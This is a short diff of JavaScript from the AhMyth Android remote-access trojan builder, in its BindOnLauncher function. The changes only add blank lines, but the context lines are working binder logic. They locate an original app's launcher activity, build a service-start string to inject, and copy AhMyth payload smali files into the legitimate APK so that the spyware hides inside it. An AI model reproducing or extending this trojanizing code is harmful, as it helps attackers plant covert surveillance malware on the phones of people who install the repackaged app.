@@ -405,7 +405,9 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
                         var regex = /\/(\S+)\./;
                         var str = (apkFolder, launcherPath);
                         var m = str.match(regex);
+			
                         var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
+			
                         var key = CONSTANTS.orgAppKey;
                         $appCtrl.Log("Modifiying Launcher Activity...");
                         $appCtrl.Log();
@@ -421,7 +423,9 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
                             var regex = /[^/]+\//;
                             var str = (apkFolder, launcherPath);
                             var m = str.match(regex);
+			    
                             var smaliFolder = m[0];
+			    
                             $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                             $appCtrl.Log();
                             fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
